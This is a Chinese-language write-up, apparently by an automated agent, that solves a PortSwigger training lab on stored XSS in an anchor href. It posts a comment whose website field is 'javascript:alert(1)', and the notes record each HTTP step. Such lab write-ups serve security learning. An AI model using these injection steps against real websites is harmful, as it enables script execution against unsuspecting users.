# lab-href-attribute-double-quotes-html-encoded

- 题面：Stored XSS into anchor href attribute with double quotes HTML-encoded；评论功能，评论者「作者名」渲染成 `<a href="<website>">`，双引号被 HTML 编码；目标=点击该链接时调用 `alert`。
- 实例：`range_launch launch 837b80f7b6cb679ddb307a046af6df7c851399e3337726434ac2681cba79f639 --jar /tmp/cj1.json` 返回 `instance_url:null`（见备注），改由 `http_dump` 读 302 `Location` 取得 `https://0a6900ce03ede76882a7ba930041005b.web-security-academy.net/`。
- 首触 `banner_verdict` = `solved:false`（非跃迁），排除复用实例的假阳性。

## 过程

1. `page_read <lab 页>`：取 widget-lab-id `837B80F7B6CB679DDB307A046AF6DF7C851399E3337726434AC2681CBA79F639`。
2. `http_dump '<launch url>' --jar /tmp/cj1.json`（不跟随）：302，`location: https://0a6900ce...web-security-academy.net/`。
3. `http_session get <base>/`：200，落盘 `/tmp/home.html`；`doc_find` 取 `postId=1`。
4. `http_session get <base>/post?postId=1`：200，落盘；`doc_find csrf` 取 `<input name="csrf" value="tHPkO5L7Evzjt4IDiXG0f95X58O1p7o7">`（同页 `postId=1`）。
5. `http_session post <base>/post/comment`（`--form csrf/postId=1/comment/name/email` + `--form website=javascript:alert(1)`）：302 → `/post/comment/confirmation?postId=1`。
6. `banner_verdict '<base>/post?postId=1' --jar /tmp/cj1.json`：`solved:true`，`<h4>Congratulations, you solved the lab!</h4>`。

## 判据

- 命中链：`website` 字段直落 href 属性值，双引号被编码 ⇒ 不破属性、直接给 `javascript:` 方案 URL，`alert` 在点击时执行。
- 件组合：`page_read` → `http_dump`（取实例）→ `http_session`（读 csrf/postId + 存评论）→ `banner_verdict`（收口）。
- 无需新件；本型不需要爆破或 victim bot，一条评论即判 solved。

## 备注

- 本会话 `range_launch` 对该 lab 连续两次 `instance_url:null`（`final_url` 停在 `https://portswigger.net/web-security/`，`oidc_form_submitted:false`），而同一 launch URL 用 `http_dump` 不跟随即见 302→实例；`/users/youraccount` 走 Auth0 报 `invalid_request`（登录会话已过期），但 launch 端点本身不需要 OIDC。get 实例的可靠姿势：直接读 launch URL 的 `Location`。
- 载荷无需引号：`javascript:alert(1)` 即可；若载荷里必须带引号会撞上双引号编码面。

## Links

- evidences: [[xss-context-family]]
